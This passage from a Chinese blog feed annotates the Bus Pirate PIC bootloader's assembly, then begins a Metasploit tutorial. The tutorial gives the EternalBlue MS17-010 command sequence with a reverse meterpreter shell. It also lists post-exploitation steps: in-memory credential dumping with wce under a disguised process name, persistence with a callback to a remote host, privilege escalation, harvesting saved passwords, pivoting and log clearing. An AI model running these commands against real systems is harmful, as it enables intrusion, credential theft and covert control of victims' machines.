class="line">;wait</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">;check for jumper</span><br><span class="line">btsc PORTB,#RB1;跳过下条指令, 如果 RB1=0(即存在jmper), 这样就继续进行配置部分</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;重要;;;;;;;;;;;;;</span><br><span class="line">bra quit ; 如果是不存在 jumper 的那么,就退出 ,开始执行 用户程序</span><br><span class="line"></span><br><span class="line">clr WFWJUMP;we came from jumper and reset, not firmware jump</span><br><span class="line"></span><br><span class="line">;注意,后面紧接着就是 setup</span><br><span class="line">setup:</span><br><span class="line">.ifdef BUSPIRATEV2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><hr><p>结合实际上的具体操作, 上面的这部分就是比较容易理解了.</p><p>实际上, 在给板子使用 bootloader 进行固件烧写的时候,的确需要一个 jumper 连接 pgc 和 pgd 这两个脚. 否则的话, 显示如下err内容,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">  Pirate-Loader for BP with Bootloader v4+</span><br><span class="line">  Loader version: 1.0.2  OS: WINDOWS</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">Parsing HEX file [BPv3-firmware-v6.2-r1981.hex]</span><br><span class="line">Found 21502 words (64506 bytes)</span><br><span class="line">Fixing bootloader/userprogram jumps</span><br><span class="line">Opening serial device COM13...OK</span><br><span class="line">Configuring serial port settings...OK</span><br><span class="line">Sending Hello to the Bootloader...ERROR</span><br><span class="line">No reply from the bootloader, or invalid reply received: 0</span><br><span class="line">Please make sure that PGND and PGC are connected, replug the devide and try again</span><br></pre></td></tr></table></figure><p>上述的代码, 就是对上电时候是否有进行 跳线进行检测, 从而执行不同的后续操作.</p><ul><li><span class="exturl" data-url="aHR0cDovL2Rhbmdlcm91c3Byb3RvdHlwZXMuY29tL2RvY3MvVjQueF90b192NC4zX3VwZ3JhZGU=" title="http://dangerousprototypes.com/docs/V4.x_to_v4.3_upgrade">Firmware Upgrade - dangerousprototypes<i class="fa fa-external-link"></i></span></li></ul><h3 id="用户程序-UserApp"><a href="#用户程序-UserApp" class="headerlink" title="用户程序 UserApp"></a>用户程序 UserApp</h3><p>在上面的bootloader , bra 到quit 标号的时候, 惊奇的发现,后面就开始执行我们的用户程序了. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">quit:;clean up from jumper test</span><br><span class="line">; 根据注释,这里应该是把 之前的跳线检测,进行复位</span><br><span class="line">bclr CNPU1, #CN5PUE ;disable pullups on PGC/CN5/RB1</span><br><span class="line">bset TRISB, #TRISB0 ;rb0 back to input</span><br><span class="line">mov #0x0000, W0 ;clear pins to analog default</span><br><span class="line">mov W0, AD1PCFG</span><br><span class="line"></span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Load user application</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">        ; 没错,就是这里, 直接到了我们的用户程序了, 永不返回;</span><br><span class="line">bra usrapp</span><br></pre></td></tr></table></figure><p>可是, 上面的 setup 必须是要有个 jumper 多麻烦, 这里的 G1k精神所在, 所以, 会有以下的标号段. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; firmware jump entry point (kind of like a function because it&apos;s never reached from the above code</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">firmwarejump:</span><br><span class="line">mov #0xffff, WFWJUMP;flag that we jumped from firmware</span><br><span class="line">bra setup;jump to just after jumper check</span><br></pre></td></tr></table></figure><p>这个符号被导出, 我们的用户程序中, 可以进行一次跳转. 回到我们的 bootloader.</p><p>这里 也找到在固件中存在的 跳转部分</p><ul><li>源文件链接 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rhbmdlcm91c1Byb3RvdHlwZXMvQnVzX1BpcmF0ZS9ibG9iL21hc3Rlci9GaXJtd2FyZS9wcm9jTWVudS5j" title="https://github.com/DangerousPrototypes/Bus_Pirate/blob/master/Firmware/procMenu.c">ProcMenu.c:666<i class="fa fa-external-link"></i></span></li></ul><p>C 代码如下<br>​<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// ProcMenu.c</span><br><span class="line">case &apos;$&apos;: //bpWline(&quot;-bootloader jump&quot;);</span><br><span class="line">    if (agree()) &#123; //bpWline(&quot;BOOTLOADER&quot;);</span><br><span class="line">        BPMSG1094;</span><br><span class="line">        bpDelayMS(100);</span><br><span class="line">        bpInit(); // turn off nasty things, cleanup first needed?</span><br><span class="line">        while (0 == UART1TXRdy()); //wait untill TX finishes</span><br><span class="line"></span><br><span class="line">// 这里使用内联汇编, 加载地址,直接跳转, 妙啊</span><br><span class="line">        asm volatile (&quot;mov #BLJUMPADDRESS, w1 \n&quot; //bootloader location</span><br><span class="line">                    &quot;goto w1 \n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Base.h</span><br><span class="line">//sets the address in the bootloader to jump to on the bootloader command</span><br><span class="line">//must be defined in asm</span><br><span class="line">asm (&quot;.equ BLJUMPADDRESS, 0xABF8&quot;);</span><br></pre></td></tr></table></figure></p><h3 id="串口初始化-UART"><a href="#串口初始化-UART" class="headerlink" title="串口初始化 UART"></a>串口初始化 UART</h3><p>在前面的检测中, 如果jumper是存在的, 这里就进行 setup操作, 这里的第一步就是配置 硬件串口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">setup:</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; UART pps config</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">.ifdef BUSPIRATEV2</span><br><span class="line">; Backup, these are restored in exit code at end of file</span><br><span class="line">; Changes needs to be done in exit, search for xxx</span><br><span class="line">movRPINR18, PPSTEMP1;xxx</span><br><span class="line">movRPOR2, PPSTEMP2;xxx</span><br><span class="line"></span><br><span class="line">; Receive, map pin to uart (RP5 on 2/3, RP3 on v1a)</span><br><span class="line">; 初始化 串口接收</span><br><span class="line">bsetRPINR18, #U1RXR0;xxx</span><br><span class="line">bclrRPINR18, #U1RXR1;xxx</span><br><span class="line">bsetRPINR18, #U1RXR2;xxx</span><br><span class="line">bclrRPINR18, #U1RXR3;xxx</span><br><span class="line">bclrRPINR18, #U1RXR4;xxx</span><br><span class="line"></span><br><span class="line">; Transmit, map uart to pin (RPOR2bits.RP4R = 3 on 2/3, RPOR1bits.RP2R=3 on v1a)</span><br><span class="line">...</span><br><span class="line">; 配置 串口发送</span><br><span class="line"></span><br><span class="line">; MODE LED on during bootload  (A1 on 2/3, B4 on v1a)</span><br><span class="line">; 增加性能的 rgb </span><br><span class="line">bset LATA, #LATA1 ;on</span><br><span class="line">bclr TRISA, #TRISA1 ;output</span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">; 不同版本</span><br><span class="line">.ifdef BUSPIRATEV1A</span><br><span class="line">...</span><br><span class="line">.endif</span><br></pre></td></tr></table></figure><hr><p>完成了配置之后, 进行初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Init</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">clrDOERASE</span><br><span class="line"></span><br><span class="line">;UART</span><br><span class="line">mov#UARTBR, W0 ;set</span><br><span class="line">mov W0, UBRG; baudrate</span><br><span class="line">bsetUMODE, #BRGH;enable BRGH</span><br><span class="line">bset UMODE, #UARTEN;enable UART</span><br><span class="line">bset USTA, #UTXEN;enable TX</span><br></pre></td></tr></table></figure><h3 id="设备握手"><a href="#设备握手" class="headerlink" title="设备握手"></a>设备握手</h3><p>这里的设备握手, 是直接在 串口的后面执行的.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Receive hello</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">    rcall Receive; 这里调用 函数符号 读取串口, 具体函数见后</span><br><span class="line">    sub #HELLO, W0;check</span><br><span class="line">; .equ HELLO, 0xC1 在前面静态定义了 HELLO 的值</span><br><span class="line">bra z, helloOK; prompt</span><br><span class="line"></span><br><span class="line">sub #&apos;#&apos;, W0; check</span><br><span class="line">; Exit point, clean up and load user application</span><br><span class="line">bra z, exit; prompt</span><br><span class="line"></span><br><span class="line">; 如果这两个符号都不是, 说明过程出现错误.</span><br><span class="line">; 打印,当前BL的硬编码版本 </span><br><span class="line">SendL   &apos;B&apos;; 发送宏</span><br><span class="line">SendL   &apos;L&apos;</span><br><span class="line">SendL   &apos;4&apos;</span><br><span class="line">SendL   &apos;+&apos;</span><br><span class="line">; 同上面的exit同样</span><br><span class="line">   bra    checkexit</span><br><span class="line"></span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Send device id and firmware version</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; 发送宏</span><br><span class="line">helloOK:SendL DEVICEID</span><br><span class="line">SendLVERMAJ</span><br><span class="line">SendL(VERMIN*16 + VERREV)</span><br><span class="line">; 这里通过串口, 把板子数据发送出去</span><br></pre></td></tr></table></figure><hr><p>串口内容的单字节接收函数, 用于握手识别 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Receive</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Init delay</span><br><span class="line">Receive:mov #BLDELAY, WDEL1</span><br><span class="line"></span><br><span class="line">; Check for received byte</span><br><span class="line">rpt1:clrWDEL2</span><br><span class="line">rptc:clrwdt;clear watchdog</span><br><span class="line">btss USTA, #URXDA</span><br><span class="line">bra notrcv; not receive 在这个函数中, 循环等待,接收</span><br><span class="line">mov URXREG, W0; 接收的数据装载在 W0</span><br><span class="line">add WCRC, W0, WCRC;add to checksum 和 进行循环冗余校验</span><br><span class="line">return</span><br></pre></td></tr></table></figure><p>串口数据发送宏, 实现单字节数据发送. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Send macro</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">.macro SendL char</span><br><span class="line">mov #\char, W0; 装载内容</span><br><span class="line">mov W0, UTXREG; </span><br><span class="line">.endm</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; Send ok</span><br><span class="line">Main:SendL OK</span><br><span class="line">; Init checksum</span><br><span class="line">main1:clr WCRC</span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Receive address</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">rcall Receive </span><br><span class="line">mov W0, TBLPAG;  </span><br><span class="line">mov.b WREG, PR1+1</span><br><span class="line">mov.b WREG, PR1</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line">; 这里的重复过程 , 从串口读取数据, 写到分配的静态空间里去.</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Receive command</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Receive nr of data bytes that will follow</span><br><span class="line">;----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h3 id="数据接收"><a href="#数据接收" class="headerlink" title="数据接收"></a>数据接收</h3><p>这里就是开始接收 数据了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Receive data</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">;; .bss</span><br><span class="line">; buffer: .space ( ROWSIZE * 3 + 1/*checksum*/ )</span><br><span class="line"> ; 在附加段, 定义了一个大的缓冲区</span><br><span class="line">mov #buffer, WBUFPTR; 加载缓冲区地址</span><br><span class="line">rcvdata:</span><br><span class="line">rcall Receive; 接收字节</span><br><span class="line">mov.b W0, [WBUFPTR++]; 循环接收</span><br><span class="line">decWCNT, WCNT; 数据计数</span><br><span class="line">bra nz, rcvdata ; 不是0 的话, 就跳转回去继续接收</span><br><span class="line"></span><br><span class="line">;last byte received is checksum</span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Check checksum</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">cp0.b WCRC; </span><br><span class="line">bra z, bladdrchk; 这里是CheckSum 的一个校验 ,合法就继续</span><br><span class="line">SendL CHECKSUMERR</span><br><span class="line">bra main1 ; 不合法, 发送校验值, 重新接收.</span><br></pre></td></tr></table></figure><h3 id="烧写准备"><a href="#烧写准备" class="headerlink" title="烧写准备"></a>烧写准备</h3><p>这里的部分, 是把数据真正的烧入 flash 前的检验工作, 确保 我写入的数据是不会影响到我 Bl 的本身的空间的, 如果影响到自己, 把自己抹掉了不就是尴尬了.<br>​<br>检查是否数据容量是否超出, 导致覆盖, 这里保留官方的注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Check address</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">;check that write and erase range does not overlap the bootloader</span><br><span class="line">;this is pretty specific to the bootloader being in the last page</span><br><span class="line">;additional checks are needed if your bootloader is located elsewhere.</span><br><span class="line">;TBLPAG is always = to 0 on this PIC, no need to verify (check if you have bigger than 64K flash)</span><br><span class="line"></span><br><span class="line">;check the end address检查结束的地址</span><br><span class="line">;write row size is fixed, any writes at (bootloader start-63) are an error</span><br><span class="line">;if write end address (W0) is &lt;= bl start address (WCNT) then OK</span><br><span class="line">;= is ok because we don&apos;t DEC after adding, write 10 bytes to 10 = end at 19</span><br><span class="line"></span><br><span class="line">bladdrchk:</span><br><span class="line">;; 在前面有定义 BL 的起始地址</span><br><span class="line">;;.equBLCHECKST,  ( STARTADDR - (ROWSIZE) )/*precalculate the first row write position that would overwrite the bootloader*/</span><br><span class="line"></span><br><span class="line">mov#BLCHECKST, WCNT;last row write postion that won&apos;t overwrite the bootloader</span><br><span class="line">;; 比较 当前内存指针, 和我们的 BL 的末地址.</span><br><span class="line">cpWADDR, WCNT;compare end address, does it overlap?</span><br><span class="line">bra GTU, bladdrerror ;if greater unsigned then error</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;handle the address error 地址错误的处理, 发送错误信息, 跳转进行重新的读.</span><br><span class="line">bladdrerror:clrDOERASE ;clear, just in case</span><br><span class="line">      SendL   BLPROT;send bootloader protection error</span><br><span class="line">bra main1 ;</span><br></pre></td></tr></table></figure><hr><p><strong>指针初始化</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Init pointer</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; 装载缓冲区地址指针</span><br><span class="line">ptrinit:mov #buffer, WBUFPTR</span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Check command</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Write row0x00 02 00 - 0x02 AB FA </span><br><span class="line">btscWCMD,#1; 这里是对烧写命令的判断</span><br><span class="line">braerase; 不为 1 ,就不擦</span><br><span class="line"></span><br><span class="line">; Else erase page</span><br><span class="line">mov#0xffff, DOERASE</span><br><span class="line">bra Main</span><br></pre></td></tr></table></figure><h3 id="烧写-Flash"><a href="#烧写-Flash" class="headerlink" title="烧写 Flash"></a>烧写 Flash</h3><p>这一部分, 就开始由 BL 实现对 Flash 的烧写了, 首先对flash 进行擦出.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Erase page</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">erase:btssDOERASE, #0;; DOERASE  标志位, 是否已经被擦出</span><br><span class="line">braprogram</span><br><span class="line">tblwtlWADDR, [WADDR];&quot;Set base address of erase block&quot;, equivalent to setting nvmadr/u in dsPIC30F?</span><br><span class="line">; Erase</span><br><span class="line">mov #0x4042, W0; 这里的W0 是一个控制字, 绝对了,写函数是进行 写, 还是擦出.</span><br><span class="line">rcall Write</span><br><span class="line">; Erase finished</span><br><span class="line">clr DOERASE</span><br></pre></td></tr></table></figure><p>对Flash 进行擦出之后, 就可以开始我们的烧写过程了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------</span><br><span class="line">; Write row</span><br><span class="line">;----------------------------------------------------------------------</span><br><span class="line">program:mov #ROWSIZE, WCNT; 寄存Row的空间</span><br><span class="line"></span><br><span class="line">; Load latches</span><br><span class="line">latlo:tblwth.b [WBUFPTR++], [WADDR] ;upper byte</span><br><span class="line">tblwtl.b[WBUFPTR++], [WADDR++] ;low byte</span><br><span class="line">tblwtl.b[WBUFPTR++], [WADDR++] ;high byte</span><br><span class="line">dec WCNT, WCNT</span><br><span class="line">bra nz, latlo</span><br><span class="line"></span><br><span class="line">; Write flash row</span><br><span class="line">mov #0x4001, W0; 这里的W0 是一个控制字</span><br><span class="line">rcall Write</span><br></pre></td></tr></table></figure><p>这里, 是写命令的实现部分, 突然发现,这里用的应该是一个硬件控制器,实现的对,flash的控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">; Write</span><br><span class="line">;------------------------------------------------------------------------------</span><br><span class="line">Write:mov W0, NVMCON; 这里是 控制器的配置部分</span><br><span class="line">mov #0x55, W0</span><br><span class="line">mov W0, NVMKEY</span><br><span class="line">mov #0xAA, W0</span><br><span class="line">mov W0, NVMKEY</span><br><span class="line"></span><br><span class="line">bset NVMCON, #WR; 置位状态字</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">; Wait for erase/write to finish</span><br><span class="line">compl:btscNVMCON, #WR; 循环等待,烧写完成</span><br><span class="line">bra compl</span><br><span class="line">return</span><br></pre></td></tr></table></figure><hr><p>对于烧写部分的后续过程, 还有, 内容校验, 和错误处理的过程.</p><pre><code>;----------------------------------------------------------------------        ; Verify row;----------------------------------------------------------------------;----------------------------------------------------------------------; Verify fail;----------------------------------------------------------------------    </code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个源码, 算是对简单的Bootloader 有了简单的了解, 在 Bp 的这个 bootloader里面, 显示通过检测 调试开关 , 决定是否进入调试状态. 之后进行串口初始化. 完成之后进行串口握手以确认设备, 即版本, 随后开始进行数据接收, 把其存放在 一个 缓冲区内, 之后通过 NVM 控制器, 对Flash进行烧写, 完成烧写过程. </p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/06/21/HackWare_Booloader/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HackTool MSF</title>
      <link>https://www.diglp.xyz/2018/06/16/HackTool_MSF/</link>
      <guid>https://www.diglp.xyz/2018/06/16/HackTool_MSF/</guid>
      <pubDate>Fri, 15 Jun 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;MSF 是 Metasploit Framework 的缩写, 可能是最著名的安全工具,没有之一了.
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>MSF 是 Metasploit Framework 的缩写, 可能是最著名的安全工具,没有之一了. </p><blockquote><p>Metasploit Framework 作为一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台。它集成了各平台上常见的溢出漏洞和流行的shellcode，并且不断更新，使得缓冲区溢出测试变得方便和简单。使用Metasploit安全测试工具在渗透测试中可以做很多事情，你可以保存你的日志、甚至定义每个有效负载在运行完成之后是如何将其自身清除的。</p></blockquote><p>在这个 框架种,集成了大量的 Vector(攻击矢量), 和Payload(有效载荷), 使得渗透过程,变得简单易得.总之功能太多,这里作一个演示使用,和部分的功能,算是自己的一些总结.</p><hr><ul><li><span class="exturl" data-url="aHR0cHM6Ly9tZXRhc3Bsb2l0LmNvbS8=" title="https://metasploit.com/">MSF offical website <i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbS9tZXRhc3Bsb2l0LXVubGVhc2hlZC9tZXRlcnByZXRlci1iYXNpY3Mv" title="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">KALI Basic Command<i class="fa fa-external-link"></i></span></li></ul><h2 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h2><p><strong>注意,这部分内容有一定的攻击性,务必在法律允许范围内使用</strong></p><p>演示的话,就使用闹起轩然大波的 <strong>MS17-010</strong> 来吧, 方法简单, 效果粗暴. 如果我同样 把它称为, <strong>永恒之蓝</strong>, 估计就熟悉的多了.</p><pre><code>use exploit/windows/smb/ms17_010_eternalblue    # 攻击矢量set payload windows/meterpreter/reverse_tcp        # 有效载荷set rhost x.x.x.x    # 目标主机set lhost x.x.x.x    # 本地监听主机            exploit# 经过若干过程,得到shell</code></pre><p>所以,可见,在MSF的框架里,对于一个exp的利用是变得如此的简单了.</p><p><strong>基本术语</strong></p><ul><li>攻击矢量 利用去渗透系统的东西</li><li>有效载荷 目标主机上实现可以利用的SHELL</li><li>反向连接 使得目标主机去主动链接我们的主机</li><li>正向链接 在目标主机开放端口,使得我们可愈长进行连接 </li></ul><h2 id="进阶-Shell-功能"><a href="#进阶-Shell-功能" class="headerlink" title="进阶 Shell 功能"></a>进阶 Shell 功能</h2><p>在 MSF 这个框架里面,其自带的 meterpreterde 这个 Shell, 功能是十分强大了 .自带了是有相当多的功能.这里只是简单的总结其中的部分了.</p><ol><li>shell        执行远程计算机的本地shell cmd</li><li>getwd        当前目录</li><li>upload / download    上传下载</li><li>portfwd        实现端口转发, 比如 3389 不开外网,可以使用转发</li><li>getgui -e    打开目标主机的 远程桌面<br> 可以使用, rdesktop 进行远程桌面连接.</li><li>route        扫描目标主机的路由表</li><li>getuid        目标主机 shell 当前用户组</li><li>sysinfo        目标主机的系统信息</li><li>migrate        线程注入, 把shell的进程注入到其他的进程的远程线程中,<br> 可能实现提权, 提高连接稳定性,不容易dead , 一般注入为, explorer.exe</li><li><p>execute        目标主机上执行程序, -f 指定文件 , -H 可以使得后台执行, -i 实现交互模式.    </p><p>execute  -H -m -d notepad.exe -f  wce.exe -a “-o  wce.txt”<br>-d 在目标主机执行时显示的进程名称（用以伪装）<br>-m 直接从内存中执行<br> “-o  wce.txt”是wce.exe的运行参数<br>实现远程内存执行</p></li><li><p>enum_drives    枚举驱动器</p></li><li>checkvm        检测是否虚拟机</li><li><p>persistence    权限维持</p><p>这个功能比较重要, persistence -X[开机自启] -i  5[间隔]  -p 4444  -r 远程控制主机</p><p>从而实现, 开机启动,及自动的连接远程主机</p></li><li><p>metsvc        一样的是权限维持, 实现了一个正向连接</p></li><li>getsystem    实现系统提权</li><li>enum_applications    枚举目标主机的所装软件</li><li>dumplinks    目标主机近期的访问记录</li><li>enum_ie        枚举IE的保存密码</li><li>route         目标主机作为跳板,实现内网渗透.</li><li>clearev        